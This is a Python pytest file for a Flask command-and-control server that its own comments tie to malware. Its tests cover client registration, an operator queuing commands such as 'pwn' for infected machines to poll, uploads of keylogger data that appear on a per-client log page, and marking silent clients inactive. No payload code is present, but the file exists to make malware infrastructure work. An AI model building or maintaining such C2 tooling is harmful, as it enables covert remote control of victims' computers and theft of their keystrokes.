import os, json, time
import sys, pathlib
root = pathlib.Path(__file__).resolve().parents[1]
sys.path.append(str(root))

from pathlib import Path

os.environ["C2_SECRET"] = "testsecret"

import db, server


# Flask provides a ready-made test client
app = server.app
app.config["TESTING"] = True
client = app.test_client()

HEAD = {"X-API-KEY": "testsecret", "Content-Type": "application/json"}
CID  = "pytest-123"

def test_register_and_command():
    r = client.post("/register", headers=HEAD, data=json.dumps({"id":CID}))
    assert r.status_code == 201

    r = client.get(f"/command?id={CID}", headers={"X-API-KEY":"testsecret"})
    assert r.get_json() == {"cmd": ""}

def test_queue_and_pop_command():
    # queue from operator
    r = client.post("/commands", data={"id":CID,"cmd":"pwn"})
    assert r.get_json()["ok"] is True
    # poll from malware
    r = client.get(f"/command?id={CID}", headers={"X-API-KEY":"testsecret"})
    assert r.get_json()["cmd"] == "pwn"
    # second poll returns empty (one-shot)
    r = client.get(f"/command?id={CID}", headers={"X-API-KEY":"testsecret"})
    assert r.get_json()["cmd"] == ""

def test_upload_and_view_log():
    payload = b"hello-keylog"
    r = client.post("/upload", headers={
        "X-API-KEY":"testsecret","X-CLIENT-ID":CID
    }, data=payload)
    assert r.get_json()["ok"] is True

    # logs endpoint should now contain text
    r = client.get(f"/logs/{CID}")
    assert b"hello-keylog" in r.data

def test_inactive_sweeper():
    # backdate the last_seen then manually run sweeper
    with db.get_conn() as c:
        c.execute("UPDATE clients SET last_seen='2000-01-01 00:00:00' WHERE id=?", (CID,))
        c.commit()
    db.mark_stale(threshold_secs=1)
    rows = db.fetch_clients()
    status = [r["status"] for r in rows if r["id"]==CID][0]
    assert status == "inactive"

